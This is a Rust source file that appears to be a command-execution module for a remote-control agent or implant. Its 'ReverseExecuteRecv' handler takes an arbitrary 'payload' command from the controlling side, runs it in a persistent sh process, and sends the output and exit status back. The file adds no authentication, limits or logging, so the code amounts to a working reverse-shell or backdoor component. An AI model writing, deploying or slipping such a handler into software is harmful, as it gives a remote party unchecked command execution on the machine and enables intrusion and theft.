use tokio::{
    process::{Child, Command},
    sync::Mutex,
};
use uuid::Uuid;
use std::process::Stdio;

use krous_macros::register_handler;
use once_cell::sync::Lazy;
use serde::{Serialize, Deserialize};

use common::{
    registry::{
        Handleable,
        Context,
    },
};

use async_trait::async_trait;

use tokio::io::{AsyncReadExt, AsyncWriteExt};


#[derive(Debug, Serialize)]
pub struct ReverseExecuteSend {
    _t: String,
    manual_request_id: Option<Uuid>,
    successful: bool,
    uuid: Uuid,
    response: Option<String> 
}

#[derive(Deserialize, Debug)]
#[register_handler]
pub struct ReverseExecuteRecv {
    _t: String,
    payload: String, // full command
    payload_response: bool, // to send back the shells output or not
    manual_request_id: Option<Uuid>
}




static SHELL: Lazy<Mutex<Child>> = Lazy::new(|| {
    let child = Command::new("sh")
        .stdin(Stdio::piped())
        .stdout(Stdio::piped())
        .spawn()
        .expect("failed to start shell");
    
    Mutex::new(child)
});


#[async_trait]
impl Handleable for ReverseExecuteRecv {
    
    async fn handle(&self, ctx: &mut Context) {
        let mut shell = SHELL.lock().await;
        let stdin = shell.stdin.as_mut().unwrap();
    
        
        stdin
            .write_all(format!("{}\necho EXITCODE:$?\n", self.payload).as_bytes())
            .await
            .unwrap();
    
        let stdout = shell.stdout.as_mut().unwrap();
        let mut buf = [0u8; 2048];
        let n = stdout.read(&mut buf).await.unwrap();
        let output = String::from_utf8_lossy(&buf[..n]);
    
        
        let (exit_code, command_output) = if let Some(idx) = output.find("EXITCODE:") {
            let (cmd_out, code_str) = output.split_at(idx);
            let code = code_str
                .trim_start_matches("EXITCODE:")
                .trim()
                .lines()
                .next()
                .unwrap_or("1")
                .parse::<i32>()
                .unwrap_or(1);
    
            (code, cmd_out.trim())
        } else {
            (1, output.trim()) // fallback
        };

        ctx.send(ReverseExecuteSend {
            _t: "ReverseExecuteSend".to_string(),
            manual_request_id: self.manual_request_id,
            successful: exit_code == 0,
            uuid: ctx.get_uuid(),
            response: if self.payload_response {
                Some(command_output.into())
            } else {
                None
            },
        });
    }
    
}




